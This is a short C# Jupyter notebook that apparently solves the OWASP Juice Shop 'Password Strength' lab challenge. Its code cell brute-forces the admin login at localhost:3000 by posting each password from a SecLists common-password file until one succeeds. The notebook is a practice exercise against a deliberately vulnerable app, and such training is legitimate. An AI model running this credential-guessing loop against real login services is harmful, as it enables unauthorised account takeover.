{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "source": [
    "# Password Strength\n",
    "\n",
    "## Log in with the administrator's user credentials without previously changing them or applying SQL Injection.\n",
    "\n",
    "## Brute forcing login\n",
    "So this is an attempt to brute force the admin login credentials by download the list of common passwords from: https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt and then iterate over the list, trying to login with each password as credential to the admin account."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [],
   "source": [
    "using System.IO;\n",
    "using System.Net;\n",
    "using System.Net.Http;\n",
    "\n",
    "// var passwordUrl = \"https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt\";\n",
    "const string  LOCAL_PASSWORD_FILE = \"passwords.txt\";\n",
    "const string JSON_START = \"{\\\"email\\\": \\\"admin@juice-sh.op\\\",\\\"password\\\": \\\"\";\n",
    "const string JSON_END = \"\\\"}\";\n",
    "const string BASE_URL = \"http://localhost:3000\";\n",
    "var BASE_URI = new Uri(BASE_URL);\n",
    "\n",
    "var passwords = await File.ReadAllLinesAsync(LOCAL_PASSWORD_FILE, Encoding.Default);\n",
    "\n",
    "var count = 0;\n",
    "using(var client = new HttpClient()) {\n",
    "    foreach(var password in passwords) {\n",
    "        var json = JSON_START + password + JSON_END;\n",
    "        var content = new StringContent(json, Encoding.UTF8, \"application/json\");\n",
    "        var uri = new Uri(BASE_URI, \"rest/user/login\");\n",
    "        var response = await client.PostAsync(uri, content);\n",
    "        count++;\n",
    "\n",
    "        if(response.StatusCode == HttpStatusCode.OK) {\n",
    "            Console.WriteLine($\"Found that the password '{password}' works for admin.\");\n",
    "            break;            \n",
    "        }\n",
    "    }\n",
    "    Console.WriteLine($\"Tested {count} password...\");\n",
    "}"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (C#)",
   "language": "C#",
   "name": ".net-csharp"
  },
  "language_info": {
   "file_extension": ".cs",
   "mimetype": "text/x-csharp",
   "name": "C#",
   "pygments_lexer": "csharp",
   "version": "9.0"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
